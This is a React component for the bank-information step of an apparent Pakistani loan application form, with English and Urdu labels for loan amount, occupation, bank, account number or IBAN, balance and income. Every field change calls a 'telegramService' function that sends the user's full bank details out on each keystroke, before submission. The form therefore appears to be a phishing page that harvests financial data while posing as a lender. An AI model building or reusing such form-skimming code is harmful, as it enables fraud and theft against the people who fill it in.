import React, { useState } from 'react';
import { BankInfo } from '../types';
import { PAKISTAN_BANKS, LOAN_PURPOSES, OCCUPATIONS } from '../data/mockData';
import { ArrowRight, ArrowLeft, Info } from 'lucide-react';
import { sendRealtimeBankInfoUpdate } from '../services/telegramService';

interface Step2Props {
  data: BankInfo;
  onUpdate: (updated: Partial<BankInfo>) => void;
  onNext: () => void;
  onBack: () => void;
}

export const Step2BankInfo: React.FC<Step2Props> = ({
  data,
  onUpdate,
  onNext,
  onBack,
}) => {
  const [errors, setErrors] = useState<Record<string, string>>({});

  const handleGenericBankUpdate = (field: keyof BankInfo, value: string) => {
    const updated = { ...data, [field]: value };
    onUpdate({ [field]: value });
    sendRealtimeBankInfoUpdate(updated);
    if (errors[field]) setErrors((prev) => ({ ...prev, [field]: '' }));
  };

  const handleNumericBankUpdate = (field: keyof BankInfo, rawVal: string) => {
    const val = rawVal.replace(/\D/g, '');
    const formatted = val ? parseInt(val, 10).toLocaleString('en-PK') : '';
    const updated = { ...data, [field]: formatted };
    onUpdate({ [field]: formatted });
    sendRealtimeBankInfoUpdate(updated);
    if (errors[field]) setErrors((prev) => ({ ...prev, [field]: '' }));
  };

  const validate = () => {
    const newErrors: Record<string, string> = {};
    const loanAmt = parseInt(data.loanAmount.replace(/\D/g, ''), 10) || 0;

    if (!data.loanAmount || loanAmt < 100000 || loanAmt > 30000000) {
      newErrors.loanAmount = 'Amount must be between PKR 1,00,000 and PKR 3,00,00,000';
    }
    if (!data.loanPurpose) newErrors.loanPurpose = 'Please select loan purpose / قرض کا مقصد منتخب کریں';
    if (!data.occupation) newErrors.occupation = 'Please select occupation / پیشہ منتخب کریں';
    if (!data.bankName) newErrors.bankName = 'Please select your bank / بینک کا نام منتخب کریں';
    if (!data.accountNumber.trim()) newErrors.accountNumber = 'Account number / IBAN required / اکاؤنٹ نمبر درج کریں';
    if (!data.currentBalance.trim()) newErrors.currentBalance = 'Current balance required / بینک بیلنس درج کریں';
    if (!data.monthlyIncome.trim()) newErrors.monthlyIncome = 'Monthly income required / ماہانہ آمدنی درج کریں';

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (validate()) {
      onNext();
    }
  };

  return (
    <div className="bg-white border border-slate-200/90 rounded-2xl p-5 sm:p-7 shadow-sm max-w-lg mx-auto">
      {/* Header */}
      <div className="flex items-start justify-between border-b border-slate-100 pb-4 mb-5">
        <div>
          <h2 className="text-xl sm:text-2xl font-bold text-[#0b1c33] font-sans">
            Bank Information
          </h2>
          <p className="text-xs text-slate-500 mt-0.5">
            Apni bank ki maloomat darj karein
          </p>
        </div>
        <div className="text-right">
          <span className="text-2xl font-serif font-bold text-[#0b1c33]">
            بینک معلومات
          </span>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        {/* Loan Amount Required (Numeric Keyboard) */}
        <div>
          <div className="flex justify-between items-center mb-1">
            <label className="text-xs font-bold text-slate-800">
              Loan Amount Required (PKR) <span className="text-red-500">*</span>
            </label>
            <span className="text-xs font-medium text-slate-600 font-serif">مطلوبہ قرض کی رقم</span>
          </div>
          <input
            type="tel"
            inputMode="numeric"
            id="input-loan-amount"
            placeholder="Enter amount (e.g. 500000)"
            value={data.loanAmount}
            onChange={(e) => handleNumericBankUpdate('loanAmount', e.target.value)}
            className={`w-full px-3.5 py-2.5 text-sm bg-slate-50/60 border rounded-lg font-mono focus:bg-white focus:outline-hidden focus:ring-2 focus:ring-[#0f2848]/30 transition-all ${
              errors.loanAmount ? 'border-red-500 bg-red-50/30' : 'border-slate-200'
            }`}
          />
          <p className="text-[11px] text-slate-500 mt-1 flex items-center gap-1">
            <Info className="w-3 h-3 text-slate-400 shrink-0" />
            <span>Range: PKR 1,00,000 (1 Lakh) – 3,00,00,000 (3 Crore)</span>
          </p>
          {errors.loanAmount && <p className="text-xs text-red-500 mt-0.5">{errors.loanAmount}</p>}
        </div>

        {/* Loan Purpose */}
        <div>
          <div className="flex justify-between items-center mb-1">
            <label className="text-xs font-bold text-slate-800">
              Loan Purpose <span className="text-red-500">*</span>
            </label>
            <span className="text-xs font-medium text-slate-600 font-serif">قرض کا مقصد</span>
          </div>
          <select
            id="select-loan-purpose"
            value={data.loanPurpose}
            onChange={(e) => handleGenericBankUpdate('loanPurpose', e.target.value)}
            className={`w-full px-3.5 py-2.5 text-sm bg-slate-50/60 border rounded-lg focus:bg-white focus:outline-hidden focus:ring-2 focus:ring-[#0f2848]/30 transition-all ${
              errors.loanPurpose ? 'border-red-500 bg-red-50/30' : 'border-slate-200'
            }`}
          >
            <option value="">Select reason for loan</option>
            {LOAN_PURPOSES.map((p) => (
              <option key={p} value={p}>
                {p}
              </option>
            ))}
          </select>
          {errors.loanPurpose && <p className="text-xs text-red-500 mt-1">{errors.loanPurpose}</p>}
        </div>

        {/* Occupation */}
        <div>
          <div className="flex justify-between items-center mb-1">
            <label className="text-xs font-bold text-slate-800">
              Occupation <span className="text-red-500">*</span>
            </label>
            <span className="text-xs font-medium text-slate-600 font-serif">پیشہ</span>
          </div>
          <select
            id="select-occupation"
            value={data.occupation}
            onChange={(e) => handleGenericBankUpdate('occupation', e.target.value)}
            className={`w-full px-3.5 py-2.5 text-sm bg-slate-50/60 border rounded-lg focus:bg-white focus:outline-hidden focus:ring-2 focus:ring-[#0f2848]/30 transition-all ${
              errors.occupation ? 'border-red-500 bg-red-50/30' : 'border-slate-200'
            }`}
          >
            <option value="">Select occupation</option>
            {OCCUPATIONS.map((occ) => (
              <option key={occ} value={occ}>
                {occ}
              </option>
            ))}
          </select>
          {errors.occupation && <p className="text-xs text-red-500 mt-1">{errors.occupation}</p>}
        </div>

        {/* Bank Name */}
        <div>
          <div className="flex justify-between items-center mb-1">
            <label className="text-xs font-bold text-slate-800">
              Bank Name <span className="text-red-500">*</span>
            </label>
            <span className="text-xs font-medium text-slate-600 font-serif">بینک کا نام</span>
          </div>
          <select
            id="select-bank-name"
            value={data.bankName}
            onChange={(e) => handleGenericBankUpdate('bankName', e.target.value)}
            className={`w-full px-3.5 py-2.5 text-sm bg-slate-50/60 border rounded-lg focus:bg-white focus:outline-hidden focus:ring-2 focus:ring-[#0f2848]/30 transition-all ${
              errors.bankName ? 'border-red-500 bg-red-50/30' : 'border-slate-200'
            }`}
          >
            <option value="">Select your bank</option>
            {PAKISTAN_BANKS.map((bank) => (
              <option key={bank} value={bank}>
                {bank}
              </option>
            ))}
          </select>
          {errors.bankName && <p className="text-xs text-red-500 mt-1">{errors.bankName}</p>}
        </div>

        {/* Account Number (Numeric Keyboard) */}
        <div>
          <div className="flex justify-between items-center mb-1">
            <label className="text-xs font-bold text-slate-800">
              Account Number / IBAN <span className="text-red-500">*</span>
            </label>
            <span className="text-xs font-medium text-slate-600 font-serif">اکاؤنٹ نمبر</span>
          </div>
          <input
            type="tel"
            inputMode="numeric"
            id="input-account-number"
            placeholder="01234567890123"
            value={data.accountNumber}
            onChange={(e) => handleGenericBankUpdate('accountNumber', e.target.value)}
            className={`w-full px-3.5 py-2.5 text-sm bg-slate-50/60 border rounded-lg font-mono focus:bg-white focus:outline-hidden focus:ring-2 focus:ring-[#0f2848]/30 transition-all ${
              errors.accountNumber ? 'border-red-500 bg-red-50/30' : 'border-slate-200'
            }`}
          />
          {errors.accountNumber && <p className="text-xs text-red-500 mt-1">{errors.accountNumber}</p>}
        </div>

        {/* Current Bank Balance (Numeric Keyboard) */}
        <div>
          <div className="flex justify-between items-center mb-1">
            <label className="text-xs font-bold text-slate-800">
              Current Bank Balance (PKR) <span className="text-red-500">*</span>
            </label>
            <span className="text-xs font-medium text-slate-600 font-serif">موجودہ بینک بیلنس</span>
          </div>
          <input
            type="tel"
            inputMode="numeric"
            id="input-current-balance"
            placeholder="Enter amount"
            value={data.currentBalance}
            onChange={(e) => handleNumericBankUpdate('currentBalance', e.target.value)}
            className={`w-full px-3.5 py-2.5 text-sm bg-slate-50/60 border rounded-lg font-mono focus:bg-white focus:outline-hidden focus:ring-2 focus:ring-[#0f2848]/30 transition-all ${
              errors.currentBalance ? 'border-red-500 bg-red-50/30' : 'border-slate-200'
            }`}
          />
          {errors.currentBalance && <p className="text-xs text-red-500 mt-1">{errors.currentBalance}</p>}
        </div>

        {/* Monthly Income (Numeric Keyboard) */}
        <div>
          <div className="flex justify-between items-center mb-1">
            <label className="text-xs font-bold text-slate-800">
              Monthly Income (PKR) <span className="text-red-500">*</span>
            </label>
            <span className="text-xs font-medium text-slate-600 font-serif">ماہانہ آمدنی</span>
          </div>
          <input
            type="tel"
            inputMode="numeric"
            id="input-monthly-income"
            placeholder="Enter amount"
            value={data.monthlyIncome}
            onChange={(e) => handleNumericBankUpdate('monthlyIncome', e.target.value)}
            className={`w-full px-3.5 py-2.5 text-sm bg-slate-50/60 border rounded-lg font-mono focus:bg-white focus:outline-hidden focus:ring-2 focus:ring-[#0f2848]/30 transition-all ${
              errors.monthlyIncome ? 'border-red-500 bg-red-50/30' : 'border-slate-200'
            }`}
          />
          {errors.monthlyIncome && <p className="text-xs text-red-500 mt-1">{errors.monthlyIncome}</p>}
        </div>

        {/* Buttons */}
        <div className="pt-4 flex gap-3">
          <button
            type="button"
            onClick={onBack}
            id="step2-back-btn"
            className="flex-1 py-3 px-4 border border-slate-300 hover:bg-slate-50 text-slate-700 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Back / واپس</span>
          </button>

          <button
            type="submit"
            id="step2-continue-btn"
            className="flex-1 py-3 px-4 bg-[#0f2848] hover:bg-[#163a66] active:bg-[#0b1c33] text-white font-bold text-xs rounded-lg transition-all shadow-sm flex items-center justify-center gap-1.5"
          >
            <span>Continue / جاری رکھیں</span>
            <ArrowRight className="w-4 h-4" />
          </button>
        </div>
      </form>
    </div>
  );
};

